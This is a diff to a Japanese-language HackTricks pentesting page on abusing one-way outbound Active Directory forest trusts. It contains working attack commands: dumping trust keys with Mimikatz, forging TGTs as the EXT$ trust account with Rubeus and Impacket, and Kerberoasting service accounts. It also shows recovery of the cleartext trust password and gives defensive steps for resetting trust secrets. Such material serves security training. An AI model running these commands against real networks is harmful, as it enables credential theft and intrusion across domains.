@@ -1,12 +1,12 @@
-# 外部フォレストドメイン - 一方向（アウトバウンド）
+# External Forest Domain - One-Way (Outbound)
 
 {{#include ../../banners/hacktricks-training.md}}
 
-このシナリオでは、**あなたのドメイン**が**異なるドメイン**のプリンシパルに**いくつかの特権**を**信頼**しています。
+このシナリオでは、**your domain** が **different domain/forest** のプリンシパルに対して、いくつかの**privileges** を **trusting** しています。
 
-## 列挙
+## Enumeration
 
-### アウトバウンドトラスト
+### Outbound Trust
 ```bash
 # Notice Outbound trust
 Get-DomainTrust
@@ -28,46 +28,101 @@ MemberName              : S-1-5-21-1028541967-2937615241-1935644758-1115
 MemberDistinguishedName : CN=S-1-5-21-1028541967-2937615241-1935644758-1115,CN=ForeignSecurityPrincipals,DC=DOMAIN,DC=LOCAL
 ## Note how the members aren't from the current domain (ConvertFrom-SID won't work)
 ```
+AD module が利用できるなら、**Trusted Domain Object (TDO)** も直接確認してください。これにより、生の LDAP-backed trust data を取得でき、後で easy path が **FSP/group abuse** なのか **trust-account abuse** なのかを判断する際に必要になります:
+```powershell
+# Enumerate the TDO created for the foreign forest/domain
+Get-ADObject -LDAPFilter '(objectClass=trustedDomain)' -SearchBase "CN=System,$((Get-ADDomain).DistinguishedName)" -Properties trustDirection,trustType,trustAttributes,flatName,securityIdentifier,whenCreated,whenChanged |
+Select Name,flatName,trustDirection,trustType,trustAttributes,securityIdentifier,whenCreated,whenChanged
+
+# Fast trust hygiene check from the outbound side
+Get-ADTrust -Identity ext.local -Properties ForestTransitive,SelectiveAuthentication,SIDFilteringQuarantined,SIDFilteringForestAware,TGTDelegation
+```
+また、`CN=ForeignSecurityPrincipals` からの foreign principals が実際にどこでアクセス権を付与されていたかも列挙すべきです。よくある成功例は次のとおりです。
+
+- 現在の domain の server/DC 上の **Local admin**
+- users/computers/GPOs に対する ACL を持つ **custom domain group** への所属
+- **computer objects** を変更する権限。これにより、trust configuration が許せば後で [RBCD](resource-based-constrained-delegation.md) に発展する可能性がある
+
 ## Trust Account Attack
 
-セキュリティの脆弱性は、ドメイン **A** とドメイン **B** の間に信頼関係が確立されるときに存在します。ここでは、ドメイン **B** がドメイン **A** に対して信頼を拡張します。この設定では、ドメイン **B** のためにドメイン **A** に特別なアカウントが作成され、これは両ドメイン間の認証プロセスにおいて重要な役割を果たします。このアカウントはドメイン **B** に関連付けられており、ドメイン間でサービスにアクセスするためのチケットを暗号化するために使用されます。
+domain/forest **B** から domain/forest **A** へ一方向の trust が作成されると（**B trusts A**）、**B** 用の **trust account** が **A** に作成されます。outbound-trust の観点で **A** を見ると、これは重要です。というのも、後で **B**（trusting side）を compromise した場合、そこから trust secret を dump して、`B$` として **A** に再認証できるからです。
 
-ここで理解すべき重要な点は、この特別なアカウントのパスワードとハッシュが、コマンドラインツールを使用してドメイン **A** のドメインコントローラーから抽出できるということです。このアクションを実行するためのコマンドは次のとおりです:
+ここで理解すべき重要な点は、その trust account の password と Kerberos material は、**trusting** domain の Domain Controller から次の方法で抽出できるということです：
 ```bash
 Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
 ```
-この抽出は、名前の後に**$**が付いたアカウントがアクティブであり、ドメイン**A**の「Domain Users」グループに属しているため、グループに関連付けられた権限を継承することができるため可能です。これにより、個人はこのアカウントの資格情報を使用してドメイン**A**に対して認証を行うことができます。
+これは、**trusted** ドメイン内に作成された trust account が有効な principal であり、そのドメイン内で通常の domain user の基本権限を持つことになるためです。これは、LDAP の列挙を開始し、ticket を要求し、次の escalation path を見つけるのに十分なことがよくあります。
 
-**警告:** この状況を利用して、限られた権限であってもユーザーとしてドメイン**A**に足場を築くことが可能です。しかし、このアクセスはドメイン**A**での列挙を行うには十分です。
-
-`ext.local`が信頼するドメインで、`root.local`が信頼されたドメインであるシナリオでは、`root.local`内に`EXT$`という名前のユーザーアカウントが作成されます。特定のツールを使用することで、Kerberos信頼キーをダンプし、`root.local`内の`EXT$`の資格情報を明らかにすることが可能です。これを達成するためのコマンドは次のとおりです:
+`ext.local` が **trusting** ドメインで、`root.local` が **trusted** ドメインである scenario では、`EXT$` という user account が `root.local` 内に作成されます。`ext.local` から trust keys をダンプすると、`root.local\EXT$` として `root.local` に対して使用できる credentials が明らかになります:
 ```bash
 lsadump::trust /patch
 ```
-これに続いて、別のツールコマンドを使用して `root.local` 内で `root.local\EXT$` として認証するために抽出された RC4 キーを使用することができます:
+これに続いて、抽出した**RC4**キーを使って `root.local` 内で `root.local\EXT$` として認証します:
 ```bash
 .\Rubeus.exe asktgt /user:EXT$ /domain:root.local /rc4:<RC4> /dc:dc.root.local /ptt
 ```
-この認証ステップは、`root.local` 内のサービスを列挙し、さらには悪用する可能性を開きます。たとえば、次のコマンドを使用してサービスアカウントの資格情報を抽出するために Kerberoast 攻撃を実行することができます。
+次に、その principal として trusted domain を列挙します。たとえば、`root.local` の高価値な SPN を Kerberoasting することで:
 ```bash
 .\Rubeus.exe kerberoast /user:svc_sql /domain:root.local /dc:dc.root.local
 ```
-### 明文の信頼パスワードの収集
+### Linuxから
 
-前のフローでは、**明文パスワード**の代わりに信頼ハッシュが使用されました（これは**mimikatzによってダンプされました**）。
+**RC4** trust-account key を取得できたなら、同じ考え方は Linux でも Impacket で使えます:
+```bash
+python getTGT.py -dc-ip dc.root.local root.local/EXT\$ -hashes :<RC4>
+export KRB5CCNAME=EXT\$.ccache
 
-明文パスワードは、mimikatzの\[ CLEAR \]出力を16進数から変換し、ヌルバイト‘\x00’を削除することで取得できます：
+# Kerberoast from the trusted domain as the trust account
+GetUserSPNs.py -request -k -no-pass -dc-ip dc.root.local root.local/EXT\$ -outputfile root_spns.kerberoast
 
-![](<../../images/image (938).png>)
+# Or reduce noise and request only one user
+GetUserSPNs.py -request-user svc_sql -k -no-pass -dc-ip dc.root.local root.local/EXT\$
+```
+**RC4** が受け入れられない場合は、復旧した **cleartext password**（または派生した **AES** keys）に切り替え、そこから通常の [Over-Pass-the-Hash / Pass-the-Key](over-pass-the-hash-pass-the-key.md) と [Kerberoast](kerberoast.md) のワークフローを再利用します。
 
-信頼関係を作成する際に、ユーザーが信頼のためにパスワードを入力する必要がある場合があります。このデモでは、キーは元の信頼パスワードであり、したがって人間が読み取れるものです。キーがサイクルする（30日ごと）と、明文は人間が読み取れなくなりますが、技術的には依然として使用可能です。
+### Key material の注意点
 
-明文パスワードは、信頼アカウントとして通常の認証を行うために使用でき、信頼アカウントのKerberos秘密鍵を使用してTGTを要求する代替手段となります。ここでは、ext.localからroot.localに対してDomain Adminsのメンバーをクエリしています：
+**trust keys** と **trust-account credentials** を混同しないでください:
 
-![](<../../images/image (792).png>)
+- one-way trust では、両側が **TDO** を保存しますが、実際の **`EXT$` user account は trusted domain 側にのみ存在**します。
+- 現在の trust-account password は、TDO trust secret（`NewPassword` / current trust key）に反映されます。
+- **RC4** trust key は、trust account として `asktgt` に再利用するのに最も扱いやすい artefact です。default setup では、trust account に `msDS-SupportedEncryptionTypes` が空であることが多いため、たいていこの enctype が動作します。
+- **AES trust keys** を使う場合は、salt が異なるため trust-account の AES keys と互換ではないことに注意してください。
 
+したがって、このページの technique では、ダンプした **RC4** material か、復旧した **cleartext** password のどちらかを優先してください。
+
+### cleartext trust password の取得
+
+前の flow では、**cleartext password** の代わりに trust hash を使っていました（これは **mimikatz** でもダンプされます）。
+
+cleartext password は、mimikatz の `\[ CLEAR ]` output を hexadecimal から変換し、null bytes `\x00` を削除することで取得できます:
+
+![Trust Account Attack - Gathering cleartext trust password: The cleartext password can be obtained by converting the ( CLEAR ) output from mimikatz from hexadecimal and removing null...](<../../images/image (938).png>)
+
+trust relationship を作成するとき、場合によっては trust 用の password を user が入力する必要があります。この demonstration では、key は元の trust password なので、人間が読める形式です。key が rotate されると（default: 30 日ごと）、cleartext は通常は人間が読めなくなりますが、技術的にはまだ利用可能です。
+
+cleartext password は、trust account の Kerberos secret key を使って TGT を要求する代わりに、trust account として通常の authentication を行うために使えます。ここでは、`ext.local` から `root.local` を問い合わせて `Domain Admins` の member を取得しています:
+
+![Trust Account Attack - Gathering cleartext trust password: The cleartext password can be used to perform regular authentication as the trust account, an alternative to requesting a TGT...](<../../images/image (792).png>)
+
+### 実用上の制限
+
+> [!WARNING]
+> Trust accounts は扱いにくい principal です。**RUNAS / console / RDP** のような interactive logon は想定された経路ではなく、**NTLM** authentication の試行は `STATUS_NOLOGON_INTERDOMAIN_TRUST_ACCOUNT` で失敗することがあります。代わりに **Kerberos network logons**（`asktgt`, LDAP, CIFS, Kerberoast`）を前提にしてください。
+
+### Persistence / cleanup の注意
+
+防御側が trusting domain の侵害に気づいた場合、`netdom trust ... /resetOneSide ...` で **両側** の trust secret を rotate する必要があります。運用者の観点では、これは **manual reset が古い trust material を即座に無効化する** 一方で、通常の trust-password rotation ではロールオーバー中に current/previous の値が残るため重要です。
+```bash
+# Run once from the trusted side
+netdom trust root.local /domain:ext.local /resetOneSide /passwordT:<NEWPASS> /userO:administrator /passwordO:*
+
+# Run once from the trusting side
+netdom trust ext.local /domain:root.local /resetOneSide /passwordT:<NEWPASS> /userO:administrator /passwordO:*
+```
 ## 参考文献
 
-- [https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted)
+- [https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-7](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-7)
+- [https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-trust](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-trust)
 
 {{#include ../../banners/hacktricks-training.md}}
